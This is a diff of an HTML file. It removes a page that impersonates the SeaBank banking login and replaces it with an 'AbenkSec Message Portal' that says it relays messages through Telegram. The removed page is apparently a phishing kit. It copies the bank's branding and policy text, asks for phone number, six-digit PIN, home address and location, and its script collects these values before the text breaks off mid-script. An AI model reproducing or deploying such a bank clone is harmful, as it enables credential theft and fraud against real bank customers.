@@ -1,931 +1,524 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login - SeaBank</title>
-    <link rel="icon" href="https://banking-aka-storage.seabank.co.id/seabank/id/live/www/live/static/20250714/03_31_19_gauspf/favicon.png">
+    <title>AbenkSec Message Portal</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/4.1.1/animate.min.css">
     <style>
-        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
-        
+        @import url('https://fonts.googleapis.com/css2?family=Playfair+Display:wght@400;700&family=Montserrat:wght@300;400;600;700&display=swap');
+
         :root {
-            --primary: #0055b3;
-            --primary-dark: #003d82;
-            --secondary: #f9fafb;
-            --text: #1f2a44;
-            --text-light: #6b7280;
-            --border: #d1d5db;
-            --error: #dc2626;
-            --white: #ffffff;
-            --success: #22c55e;
-            --dark-bg: #111827;
-            --dark-secondary: #1f2a44;
+            --gold-accent: #D4AF37;
+            --black-primary: #0A0A0A;
+            --black-secondary: #1C2526;
+            --text-light: #E8ECEF;
+            --shadow-dark: rgba(0, 0, 0, 0.5);
         }
-        
+
         * {
+            box-sizing: border-box;
+        }
+
+        body {
             margin: 0;
             padding: 0;
-            box-sizing: border-box;
-            font-family: 'Poppins', sans-serif;
-        }
-        
-        body {
-            background: linear-gradient(145deg, #e5f0ff 0%, #f1f5f9 100%);
+            font-family: 'Montserrat', sans-serif;
+            background: linear-gradient(135deg, var(--black-primary) 0%, var(--black-secondary) 100%);
+            color: var(--text-light);
+            min-height: 100vh;
             display: flex;
             flex-direction: column;
-            min-height: 100vh;
-            overflow-x: hidden;
-            color: var(--text);
-            animation: elegantFadeIn 1.2s cubic-bezier(0.4, 0, 0.2, 1) forwards;
+            opacity: 0;
+            animation: fadeIn 1.5s ease-in-out forwards;
         }
-        
-        @keyframes elegantFadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
         }
-        
-        body.dark-mode {
-            background: linear-gradient(145deg, var(--dark-bg) 0%, #1f2a44 100%);
-            color: var(--white);
-        }
-        
-        body.dark-mode .login-form,
-        body.dark-mode .modal-content {
-            background-color: var(--dark-secondary);
-            border-color: rgba(255, 255, 255, 0.15);
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.5);
-        }
-        
-        body.dark-mode input {
-            background-color: #374151;
-            color: var(--white);
-            border-color: rgba(255, 255, 255, 0.2);
-        }
-        
-        body.dark-mode .form-group label,
-        body.dark-mode .modal-body {
-            color: var(--white);
-        }
-        
+
         .container {
-            max-width: 480px;
+            max-width: 1200px;
             margin: 0 auto;
             padding: 20px;
             flex: 1;
             display: flex;
             flex-direction: column;
-            justify-content: center;
-        }
-        
-        .theme-toggle {
-            position: absolute;
-            top: 20px;
-            right: 20px;
-            width: 40px;
-            height: 40px;
-            background: linear-gradient(145deg, var(--primary), var(--primary-dark));
-            color: var(--white);
-            border-radius: 50%;
-            display: flex;
             align-items: center;
             justify-content: center;
-            cursor: pointer;
-            transition: all 0.3s ease;
-            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.2);
         }
-        
-        .theme-toggle:hover {
-            transform: rotate(15deg) scale(1.1);
-            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
-        }
-        
-        .theme-toggle.dark {
-            background: linear-gradient(145deg, #4b5563, #374151);
-        }
-        
+
         .logo-container {
             text-align: center;
-            margin-bottom: 30px;
-            transition: transform 0.3s ease;
+            margin: 30px 0;
+            animation: slideInDown 1s ease-out;
         }
-        
-        .logo-container:hover {
-            transform: scale(1.03);
+
+        @keyframes slideInDown {
+            from { transform: translateY(-50px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
-        
+
         .logo {
-            width: 120px;
+            max-width: 220px;
             height: auto;
-            filter: drop-shadow(0 3px 6px rgba(0, 85, 179, 0.2));
-        }
-        
-        .login-form {
-            background-color: var(--white);
-            padding: 35px;
-            border-radius: 20px;
-            box-shadow: 0 12px 40px rgba(0, 85, 179, 0.15);
-            transition: transform 0.3s ease, box-shadow 0.3s ease;
-            border: 1px solid rgba(0, 85, 179, 0.1);
-            position: relative;
-        }
-        
-        .login-form:hover {
-            transform: translateY(-8px);
-            box-shadow: 0 18px 45px rgba(0, 85, 179, 0.2);
-        }
-        
-        .success-message {
-            display: none;
-            position: absolute;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background: rgba(255, 255, 255, 0.98);
-            border-radius: 20px;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            text-align: center;
-            z-index: 10;
-            animation: fadeIn 0.5s ease;
-        }
-        
-        .success-message.active {
-            display: flex;
-        }
-        
-        .success-icon {
-            width: 80px;
-            height: 80px;
-            background: var(--success);
             border-radius: 50%;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            margin-bottom: 20px;
-            animation: scaleIn 0.4s ease;
+            border: 2px solid var(--gold-accent);
+            box-shadow: 0 10px 30px var(--shadow-dark);
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
         }
-        
-        .success-icon::before {
-            content: '✔';
-            color: var(--white);
-            font-size: 40px;
-            font-weight: bold;
+
+        .logo:hover {
+            transform: scale(1.05);
+            box-shadow: 0 15px 40px var(--shadow-dark);
         }
-        
-        @keyframes scaleIn {
-            from {
-                transform: scale(0);
-            }
-            to {
-                transform: scale(1);
-            }
-        }
-        
+
         h1 {
-            text-align: center;
-            color: var(--primary);
-            margin-bottom: 30px;
-            font-size: 28px;
+            font-family: 'Playfair Display', serif;
             font-weight: 700;
-            letter-spacing: 0.3px;
+            font-size: 3rem;
+            margin: 20px 0;
+            text-align: center;
+            color: var(--gold-accent);
+            text-shadow: 0 2px 4px var(--shadow-dark);
+            animation: fadeInUp 1s ease-out 0.3s both;
         }
-        
-        .form-group {
-            margin-bottom: 20px;
+
+        @keyframes fadeInUp {
+            from { transform: translateY(20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .description {
+            font-size: 1.2rem;
+            line-height: 1.8;
+            max-width: 800px;
+            text-align: center;
+            margin-bottom: 40px;
+            color: var(--text-light);
+            animation: fadeInUp 1s ease-out 0.6s both;
+        }
+
+        .message-form {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(15px);
+            border-radius: 20px;
+            padding: 40px;
+            width: 100%;
+            max-width: 700px;
+            box-shadow: 0 10px 40px var(--shadow-dark);
+            border: 1px solid var(--gold-accent);
+            animation: fadeInUp 1s ease-out 0.9s both;
             position: relative;
         }
-        
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
         label {
             display: block;
-            margin-bottom: 8px;
-            color: var(--text);
-            font-weight: 500;
-            font-size: 13px;
-        }
-        
-        input {
-            width: 100%;
-            padding: 12px 15px;
-            border: 1px solid var(--border);
-            border-radius: 10px;
-            font-size: 14px;
-            transition: all 0.3s ease;
-            background-color: var(--secondary);
-        }
-        
-        input:focus {
-            outline: none;
-            border-color: var(--primary);
-            box-shadow: 0 0 0 3px rgba(0, 85, 179, 0.1);
-            background-color: var(--white);
-        }
-        
-        input[type="number"]::-webkit-inner-spin-button,
-        input[type="number"]::-webkit-outer-spin-button {
-            -webkit-appearance: none;
-            margin: 0;
-        }
-        
-        .btn {
-            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
-            color: var(--white);
-            border: none;
-            padding: 14px;
-            border-radius: 10px;
-            font-size: 15px;
+            margin-bottom: 10px;
             font-weight: 600;
-            cursor: pointer;
+            color: var(--gold-accent);
+        }
+
+        textarea {
             width: 100%;
+            padding: 15px;
+            border: 1px solid var(--gold-accent);
+            border-radius: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            color: var(--text-light);
+            font-family: 'Montserrat', sans-serif;
+            font-size: 1.1rem;
+            resize: vertical;
+            min-height: 180px;
             transition: all 0.3s ease;
-            box-shadow: 0 3px 8px rgba(0, 85, 179, 0.2);
-            letter-spacing: 0.4px;
         }
-        
-        .btn:hover {
-            background: linear-gradient(90deg, #004099, #002e66);
-            box-shadow: 0 5px 12px rgba(0, 85, 179, 0.3);
+
+        textarea:focus {
+            outline: none;
+            border-color: var(--gold-accent);
+            background: rgba(255, 255, 255, 0.15);
+            box-shadow: 0 0 10px var(--gold-accent);
+        }
+
+        textarea::placeholder {
+            color: #A0A0A0;
+        }
+
+        button {
+            background: linear-gradient(135deg, var(--gold-accent) 0%, #B8860B 100%);
+            color: var(--black-primary);
+            border: none;
+            padding: 15px 40px;
+            font-size: 1.1rem;
+            border-radius: 10px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-weight: 700;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            width: 100%;
+            margin-top: 20px;
+            position: relative;
+        }
+
+        button:hover {
+            background: linear-gradient(135deg, #B8860B 0%, var(--gold-accent) 100%);
             transform: translateY(-3px);
+            box-shadow: 0 5px 20px var(--shadow-dark);
         }
-        
-        .btn:active {
-            transform: translateY(0);
-        }
-        
-        .btn:disabled {
-            opacity: 0.6;
+
+        button:disabled {
+            background: #666;
             cursor: not-allowed;
         }
-        
-        .location-permission {
-            margin-top: 20px;
-            display: flex;
-            align-items: center;
-            justify-content: space-between;
-            background-color: var(--secondary);
-            padding: 12px;
-            border-radius: 10px;
-            border: 1px solid var(--border);
-        }
-        
-        .location-permission label {
-            margin-bottom: 0;
-            flex: 1;
-            font-size: 13px;
-            color: var(--text-light);
-        }
-        
-        .switch {
-            position: relative;
-            display: inline-block;
-            width: 48px;
+
+        button .spinner {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 24px;
             height: 24px;
-        }
-        
-        .switch input {
-            opacity: 0;
-            width: 0;
-            height: 0;
-        }
-        
-        .slider {
-            position: absolute;
-            cursor: pointer;
-            top: 0;
-            left: 0;
-            right: 0;
-            bottom: 0;
-            background-color: var(--border);
-            transition: .3s;
-            border-radius: 24px;
-        }
-        
-        .slider:before {
-            position: absolute;
-            content: "";
-            height: 18px;
-            width: 18px;
-            left: 3px;
-            bottom: 3px;
-            background-color: var(--white);
-            transition: .3s;
+            border: 3px solid rgba(255, 255, 255, 0.3);
             border-radius: 50%;
+            border-top-color: var(--black-primary);
+            animation: spin 1s ease-in-out infinite;
         }
-        
-        input:checked + .slider {
-            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
+
+        button.loading .spinner {
+            display: block;
         }
-        
-        input:checked + .slider:before {
-            transform: translateX(24px);
+
+        button.loading span {
+            visibility: hidden;
         }
-        
+
+        @keyframes spin {
+            to { transform: translate(-50%, -50%) rotate(360deg); }
+        }
+
         footer {
-            background: linear-gradient(90deg, var(--primary), var(--primary-dark));
-            color: var(--white);
             text-align: center;
-            padding: 20px 15px;
-            font-size: 13px;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.2);
             margin-top: auto;
+            font-size: 0.9rem;
+            color: var(--text-light);
+            animation: fadeIn 1s ease-out 1.2s both;
         }
-        
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 20px;
-            margin-bottom: 15px;
-            flex-wrap: wrap;
-        }
-        
-        .footer-links a {
-            color: var(--white);
-            text-decoration: none;
-            transition: all 0.3s ease;
-            font-weight: 500;
-            font-size: 12px;
-        }
-        
-        .footer-links a:hover {
-            text-decoration: underline;
-            transform: translateY(-2px);
-        }
-        
-        .error-message {
-            color: var(--error);
-            font-size: 12px;
-            margin-top: 5px;
-            display: none;
-        }
-        
-        .swipe-container {
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .swipe-overlay {
-            position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: linear-gradient(90deg, rgba(0, 85, 179, 0.1), rgba(0, 85, 179, 0.05));
-            transform: translateX(-100%);
-            pointer-events: none;
-        }
-        
-        .login-form:hover .swipe-overlay {
-            animation: swipe 1.2s ease-in-out;
-        }
-        
-        @keyframes swipe {
-            0% {
-                transform: translateX(-100%);
-            }
-            50% {
-                transform: translateX(100%);
-            }
-            100% {
-                transform: translateX(100%);
-            }
-        }
-        
-        /* Modal Styles */
-        .modal {
-            display: none;
+
+        .success-notification {
             position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background-color: rgba(0, 0, 0, 0.75);
-            z-index: 1000;
-            overflow-y: auto;
-        }
-        
-        .modal-content {
-            background-color: var(--white);
-            margin: 5% auto;
-            padding: 25px;
-            border-radius: 15px;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%) scale(0.8);
+            background: rgba(10, 10, 10, 0.95);
+            color: var(--text-light);
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 10px 40px var(--shadow-dark);
+            text-align: center;
+            max-width: 450px;
             width: 90%;
-            max-width: 700px;
-            max-height: 80vh;
-            overflow-y: auto;
-            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.4);
-            animation: modalFadeIn 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.4s ease;
+            z-index: 1000;
+            border: 1px solid var(--gold-accent);
         }
-        
-        @keyframes modalFadeIn {
-            from {
-                opacity: 0;
-                transform: translateY(-30px);
-            }
-            to {
-                opacity: 1;
-                transform: translateY(0);
-            }
+
+        .success-notification.show {
+            opacity: 1;
+            visibility: visible;
+            transform: translate(-50%, -50%) scale(1);
         }
-        
-        .modal-header {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
+
+        .checkmark {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 20px;
+        }
+
+        .checkmark__circle {
+            stroke-dasharray: 166;
+            stroke-dashoffset: 166;
+            stroke-width: 2;
+            stroke-miterlimit: 10;
+            stroke: var(--gold-accent);
+            fill: none;
+            animation: stroke 0.6s cubic-bezier(0.65, 0, 0.45, 1) forwards;
+        }
+
+        .checkmark__check {
+            transform-origin: 50% 50%;
+            stroke-dasharray: 48;
+            stroke-dashoffset: 48;
+            stroke-width: 2;
+            stroke-miterlimit: 10;
+            stroke: var(--gold-accent);
+            fill: none;
+            animation: stroke 0.3s cubic-bezier(0.65, 0, 0.45, 1) 0.8s forwards;
+        }
+
+        @keyframes stroke {
+            100% { stroke-dashoffset: 0; }
+        }
+
+        .success-title {
+            font-size: 1.7rem;
+            font-weight: 700;
             margin-bottom: 15px;
-            padding-bottom: 10px;
-            border-bottom: 1px solid var(--border);
+            color: var(--gold-accent);
         }
-        
-        .modal-title {
-            color: var(--primary);
-            font-size: 20px;
+
+        .success-message {
+            font-size: 1.1rem;
+            margin-bottom: 20px;
+        }
+
+        .close-notification {
+            background: var(--gold-accent);
+            color: var(--black-primary);
+            border: none;
+            padding: 10px 25px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s ease;
             font-weight: 600;
         }
-        
-        .close-modal {
-            font-size: 22px;
-            font-weight: bold;
-            color: var(--text-light);
-            cursor: pointer;
-            transition: color 0.3s;
+
+        .close-notification:hover {
+            background: #B8860B;
         }
-        
-        .close-modal:hover {
-            color: var(--text);
-        }
-        
-        .modal-body {
-            line-height: 1.7;
-            font-size: 13px;
-            color: var(--text);
-        }
-        
-        .modal-body h2 {
-            color: var(--primary);
-            margin: 15px 0 8px;
-            font-size: 16px;
-        }
-        
-        .modal-body p {
-            margin-bottom: 12px;
-        }
-        
-        .modal-body ul {
-            margin-bottom: 12px;
-            padding-left: 18px;
-        }
-        
-        .modal-body li {
-            margin-bottom: 6px;
+
+        @media (max-width: 768px) {
+            h1 { font-size: 2.2rem; }
+            .description { font-size: 1rem; }
+            .message-form { padding: 25px; }
+            .success-notification { padding: 25px; }
+            .checkmark { width: 60px; height: 60px; }
         }
     </style>
 </head>
 <body>
-    <div class="theme-toggle" id="themeToggle">🌙</div>
     <div class="container">
         <div class="logo-container">
-            <img src="https://banking-aka-storage.seabank.co.id/seabank/id/live/www/live/static/20250714/03_31_19_gauspf/favicon.png" alt="SeaBank Logo" class="logo">
+            <img src="https://iili.io/FvRNz0X.th.png" alt="AbenkSec Logo" class="logo">
         </div>
-        
-        <div class="login-form swipe-container">
-            <div class="swipe-overlay"></div>
-            <div class="success-message" id="successMessage">
-                <div class="success-icon"></div>
-                <h2>Terima Kasih Telah Login!</h2>
-                <p>Kami akan segera menghubungi Anda untuk langkah selanjutnya.</p>
-            </div>
-            <h1>Masuk ke SeaBank</h1>
-            
-            <form id="loginForm">
+
+        <h1 class="animated-text">TEAM CLAY WHITE</h1>
+
+        <p class="description">
+            Selamat datang di AbenkSec Message Portal. Kirim pesan Anda dengan aman kepada saya. Harap hindari spam. Terima kasih atas kerja samanya.
+        </p>
+
+        <div class="message-form">
+            <form id="messageForm">
                 <div class="form-group">
-                    <label for="phone">Nomor Telepon</label>
-                    <input type="tel" id="phone" name="phone" placeholder="Contoh: 081234567890" required>
+                    <label for="message">Pesan Anda:</label>
+                    <textarea id="message" name="message" placeholder="Tulis pesan Anda di sini..." required></textarea>
                 </div>
-                
-                <div class="form-group">
-                    <label for="pin">PIN (6 digit)</label>
-                    <input type="number" id="pin" name="pin" placeholder="Masukkan PIN 6 digit" maxlength="6" pattern="\d{6}" required>
-                    <div id="pinError" class="error-message">PIN harus 6 digit angka</div>
-                </div>
-                
-                <div class="form-group">
-                    <label for="address">Alamat Lengkap</label>
-                    <input type="text" id="address" name="address" placeholder="Contoh: Jl. Sudirman No. 123, Jakarta">
-                    <div id="addressError" class="error-message">Harap masukkan alamat jika mengaktifkan izin lokasi</div>
-                </div>
-                
-                <div class="form-group">
-                    <button type="submit" class="btn" id="loginButton">MASUK</button>
-                </div>
-                
-                <div class="location-permission">
-                    <label for="locationToggle">Izinkan akses lokasi saya</label>
-                    <label class="switch">
-                        <input type="checkbox" id="locationToggle">
-                        <span class="slider"></span>
-                    </label>
-                </div>
+                <button type="submit" id="submitBtn">
+                    <span>Kirim Pesan</span>
+                    <div class="spinner"></div>
+                </button>
             </form>
         </div>
     </div>
-    
+
     <footer>
-        <div class="footer-links">
-            <a href="#" id="aboutLink">Tentang Kami</a>
-            <a href="#" id="privacyLink">Kebijakan Privasi</a>
-            <a href="#" id="termsLink">Syarat dan Ketentuan</a>
-            <a href="#" id="locationLink">Lokasi Cabang</a>
-        </div>
-        <p>© 2023 SeaBank. All Rights Reserved.</p>
+        &copy; 2025 TCW | AbenkSec Message Portal
     </footer>
-    
-    <!-- Modal About -->
-    <div id="aboutModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2 class="modal-title">Tentang SeaBank</h2>
-                <span class="close-modal">×</span>
-            </div>
-            <div class="modal-body">
-                <p>SeaBank adalah bank digital yang berkomitmen untuk memberikan kemudahan akses keuangan bagi seluruh masyarakat Indonesia. Kami hadir dengan layanan perbankan yang simpel, aman, dan dapat diakses kapan saja dan di mana saja melalui smartphone Anda.</p>
-                
-                <h2>Visi</h2>
-                <p>Menjadi mitra keuangan digital terpercaya yang memberikan kemudahan akses dan manfaat maksimal bagi seluruh lapisan masyarakat Indonesia.</p>
-                
-                <h2>Misi</h2>
-                <ul>
-                    <li>Menyediakan layanan perbankan digital yang inovatif dan mudah digunakan</li>
-                    <li>Memberikan akses keuangan yang inklusif bagi seluruh masyarakat</li>
-                    <li>Menjaga keamanan dan kerahasiaan data nasabah</li>
-                    <li>Memberikan pengalaman perbankan digital yang menyenangkan</li>
-                </ul>
-                
-                <h2>Layanan Kami</h2>
-                <ul>
-                    <li>Tabungan digital dengan bunga kompetitif</li>
-                    <li>Transfer antar bank gratis</li>
-                    <li>Pembayaran dan pembelian mudah</li>
-                    <li>Pinjaman digital dengan proses cepat</li>
-                    <li>Berbagai promo menarik setiap bulannya</li>
-                </ul>
-            </div>
-        </div>
+
+    <div class="success-notification" id="successNotification">
+        <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+            <circle class="checkmark__circle" cx="26" cy="26" r="25" fill="none"/>
+            <path class="checkmark__check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+        </svg>
+        <h3 class="success-title">Pesan Terkirim!</h3>
+        <p class="success-message">Pesan Anda telah berhasil dikirim melalui Telegram. Kami akan segera menanggapinya.</p>
+        <button class="close-notification" id="closeNotification">Tutup</button>
     </div>
-    
-    <!-- Modal Privacy Policy -->
-    <div id="privacyModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2 class="modal-title">Kebijakan Privasi SeaBank</h2>
-                <span class="close-modal">×</span>
-            </div>
-            <div class="modal-body">
-                <p>Terakhir diperbarui: 1 Januari 2023</p>
-                
-                <h2>1. Pendahuluan</h2>
-                <p>Kebijakan Privasi ini menjelaskan bagaimana PT Bank SeaBank Indonesia ("SeaBank", "kami") mengumpulkan, menggunakan, mengungkapkan, melindungi, dan menyimpan informasi pribadi Anda ketika Anda menggunakan layanan perbankan digital kami ("Layanan").</p>
-                
-                <h2>2. Informasi yang Kami Kumpulkan</h2>
-                <p>Kami dapat mengumpulkan berbagai jenis informasi, termasuk:</p>
-                <ul>
-                    <li>Informasi identitas pribadi (nama, alamat, nomor identitas, dll.)</li>
-                    <li>Informasi kontak (nomor telepon, email, dll.)</li>
-                    <li>Informasi keuangan (riwayat transaksi, saldo, dll.)</li>
-                    <li>Informasi perangkat (IP address, jenis perangkat, dll.)</li>
-                    <li>Informasi lokasi (jika diizinkan)</li>
-                </ul>
-                
-                <h2>3. Penggunaan Informasi</h2>
-                <p>Informasi yang kami kumpulkan digunakan untuk:</p>
-                <ul>
-                    <li>Menyediakan dan memelihara Layanan kami</li>
-                    <li>Memverifikasi identitas Anda</li>
-                    <li>Mencegah penipuan dan aktivitas ilegal</li>
-                    <li>Meningkatkan pengalaman pengguna</li>
-                    <li>Mengembangkan produk dan layanan baru</li>
-                    <li>Memenuhi kewajiban hukum dan regulasi</li>
-                </ul>
-                
-                <h2>4. Perlindungan Data</h2>
-                <p>Kami menggunakan langkah-langkah keamanan teknis dan organisasi yang sesuai untuk melindungi informasi pribadi Anda dari akses, pengungkapan, perubahan, atau penghancuran yang tidak sah.</p>
-                
-                <h2>5. Pembaruan Kebijakan</h2>
-                <p>Kami dapat memperbarui Kebijakan Privasi ini dari waktu ke waktu. Kami akan memberi tahu Anda tentang perubahan material dengan memposting pemberitahuan di situs web kami atau melalui metode lain yang sesuai.</p>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Modal Terms -->
-    <div id="termsModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2 class="modal-title">Syarat dan Ketentuan Layanan SeaBank</h2>
-                <span class="close-modal">×</span>
-            </div>
-            <div class="modal-body">
-                <p>Dengan mengakses dan menggunakan layanan SeaBank, Anda setuju untuk terikat oleh Syarat dan Ketentuan berikut:</p>
-                
-                <h2>1. Penggunaan Layanan</h2>
-                <ul>
-                    <li>Anda harus berusia minimal 17 tahun atau sudah menikah untuk menggunakan layanan kami</li>
-                    <li>Anda bertanggung jawab untuk menjaga kerahasiaan informasi akun Anda</li>
-                    <li>Anda setuju untuk memberikan informasi yang akurat dan lengkap</li>
-                </ul>
-                
-                <h2>2. Akun Pengguna</h2>
-                <ul>
-                    <li>Satu nomor telepon hanya dapat digunakan untuk satu akun SeaBank</li>
-                    <li>Anda bertanggung jawab penuh atas semua aktivitas yang terjadi di akun Anda</li>
-                    <li>Segera laporkan jika Anda mencurigai adanya penggunaan yang tidak sah</li>
-                </ul>
-                
-                <h2>3. Transaksi</h2>
-                <ul>
-                    <li>Transaksi yang telah diproses tidak dapat dibatalkan</li>
-                    <li>Kami berhak menolak atau membatalkan transaksi yang mencurigakan</li>
-                    <li>Biaya-biaya tertentu mungkin berlaku untuk layanan tertentu</li>
-                </ul>
-                
-                <h2>4. Pembatasan</h2>
-                <p>Anda tidak diperbolehkan:</p>
-                <ul>
-                    <li>Menggunakan layanan untuk aktivitas ilegal</li>
-                    <li>Mencoba mendapatkan akses tidak sah ke sistem kami</li>
-                    <li>Mengganggu operasi normal layanan kami</li>
-                </ul>
-                
-                <h2>5. Perubahan Syarat</h2>
-                <p>Kami dapat mengubah Syarat dan Ketentuan ini dari waktu ke waktu. Perubahan akan diberitahukan melalui aplikasi atau situs web kami.</p>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Modal Location -->
-    <div id="locationModal" class="modal">
-        <div class="modal-content">
-            <div class="modal-header">
-                <h2 class="modal-title">Lokasi Cabang SeaBank</h2>
-                <span class="close-modal">×</span>
-            </div>
-            <div class="modal-body">
-                <h2>Kantor Pusat</h2>
-                <p>SeaBank Tower, Jl. Jend. Sudirman Kav. 52-53, Jakarta Selatan 12190</p>
-                
-                <h2>Cabang Utama</h2>
-                <ul>
-                    <li><strong>Jakarta</strong>: Plaza Senayan Lt. 5, Jl. Asia Afrika No. 8</li>
-                    <li><strong>Surabaya</strong>: Tunjungan Plaza 6, Jl. Embong Malang 21-31</li>
-                    <li><strong>Bandung</strong>: Paris Van Java, Jl. Sukajadi 137-139</li>
-                    <li><strong>Medan</strong>: Sun Plaza, Jl. H. Zainul Arifin No. 7</li>
-                    <li><strong>Makassar</strong>: Trans Studio Mall, Jl. Metro Tanjung Bunga</li>
-                </ul>
-                
-                <h2>Jam Operasional</h2>
-                <p>Senin - Jumat: 09.00 - 16.00 WIB</p>
-                <p>Sabtu: 09.00 - 14.00 WIB</p>
-                <p>Minggu dan Hari Libur: Tutup</p>
-                
-                <h2>ATM SeaBank</h2>
-                <p>ATM SeaBank tersedia di lebih dari 500 lokasi di seluruh Indonesia. Gunakan aplikasi SeaBank untuk menemukan ATM terdekat.</p>
-            </div>
-        </div>
-    </div>
-    
+
     <script>
         document.addEventListener('DOMContentLoaded', function() {
-            // Login Form Functionality
-            const loginForm = document.getElementById('loginForm');
-            const locationToggle = document.getElementById('locationToggle');
-            const addressInput = document.getElementById('address');
-            const addressError = document.getElementById('addressError');
-            const pinInput = document.getElementById('pin');
-            const pinError = document.getElementById('pinError');
-            const successMessage = document.getElementById('successMessage');
-            const loginButton = document.getElementById('loginButton');
-            
-            // Modal Elements
-            const aboutModal = document.getElementById('aboutModal');
-            const privacyModal = document.getElementById('privacyModal');
-            const termsModal = document.getElementById('termsModal');
-            const locationModal = document.getElementById('locationModal');
-            
-            // Modal Links
-            const aboutLink = document.getElementById('aboutLink');
-            const privacyLink = document.getElementById('privacyLink');
-            const termsLink = document.getElementById('termsLink');
-            const locationLink = document.getElementById('locationLink');
-            
-            // Theme Toggle
-            const themeToggle = document.getElementById('themeToggle');
-            
-            // Close Buttons
-            const closeButtons = document.querySelectorAll('.close-modal');
-            
-            // Theme toggle functionality
-            themeToggle.addEventListener('click', function() {
-                document.body.classList.toggle('dark-mode');
-                themeToggle.textContent = document.body.classList.contains('dark-mode') ? '☀️' : '🌙';
-                themeToggle.classList.toggle('dark');
-            });
-            
-            // Validasi alamat jika izin lokasi diaktifkan
-            locationToggle.addEventListener('change', function() {
-                if (this.checked && addressInput.value.trim() === '') {
-                    addressError.style.display = 'block';
-                    addressInput.style.borderColor = 'var(--error)';
-                } else {
-                    addressError.style.display = 'none';
-                    addressInput.style.borderColor = 'var(--border)';
-                }
-            });
-            
-            addressInput.addEventListener('input', function() {
-                if (locationToggle.checked && this.value.trim() !== '') {
-                    addressError.style.display = 'none';
-                    this.style.borderColor = 'var(--border)';
-                }
-            });
-            
-            // Validasi PIN
-            pinInput.addEventListener('input', function() {
-                const pin = this.value;
-                if (pin.length === 6 && /^\d{6}$/.test(pin)) {
-                    pinError.style.display = 'none';
-                    this.style.borderColor = 'var(--border)';
-                } else {
-                    pinError.style.display = 'block';
-                    this.style.borderColor = 'var(--error)';
-                }
-            });
-            
-            loginForm.addEventListener('submit', function(e) {
-                e.preventDefault();
-                
-                const phone = document.getElementById('phone').value;
-                const pin = pinInput.value;
-                const address = addressInput.value.trim();
-                const locationPermission = locationToggle.checked;
-                
-                // Validasi akhir
-                if (pin.length !== 6 || !/^\d{6}$/.test(pin)) {
-                    pinError.style.display = 'block';
-                    pinInput.style.borderColor = 'var(--error)';
-                    pinInput.focus();
-                    return;
-                }
-                
-                if (locationPermission && address === '') {
-                    addressError.style.display = 'block';
-                    addressInput.style.borderColor = 'var(--error)';
-                    addressInput.focus();
-                    return;
-                }
-                
-                console.log('Login attempt with:', { phone, pin, address, locationPermission });
-                
-                // Animasi loading
-                loginButton.innerHTML = '<span class="loading">Memproses...</span>';
-                loginButton.disabled = true;
-                
-                if (locationPermission) {
-                    requestLocationAccess()
-                        .then((position) => {
-                            simulateLogin(phone, pin, address, locationPermission, position);
-                        })
-                        .catch((error) => {
-                            console.error('Error:', error);
-                            simulateLogin(phone, pin, address, locationPermission, null);
-                        });
-                } else {
-                    simulateLogin(phone, pin, address, locationPermission, null);
-                }
-            });
-            
-            // Modal Event Listeners
-            aboutLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                aboutModal.style.display = 'block';
-            });
-            
-            privacyLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                privacyModal.style.display = 'block';
-            });
-            
-            termsLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                termsModal.style.display = 'block';
-            });
-            
-            locationLink.addEventListener('click', function(e) {
-                e.preventDefault();
-                locationModal.style.display = 'block';
-            });
-            
-            // Close Modal when clicking X
-            closeButtons.forEach(button => {
-                button.addEventListener('click', function() {
-                    this.closest('.modal').style.display = 'none';
-                });
-            });
-            
-            // Close Modal when clicking outside
-            window.addEventListener('click', function(e) {
-                if (e.target.classList.contains('modal')) {
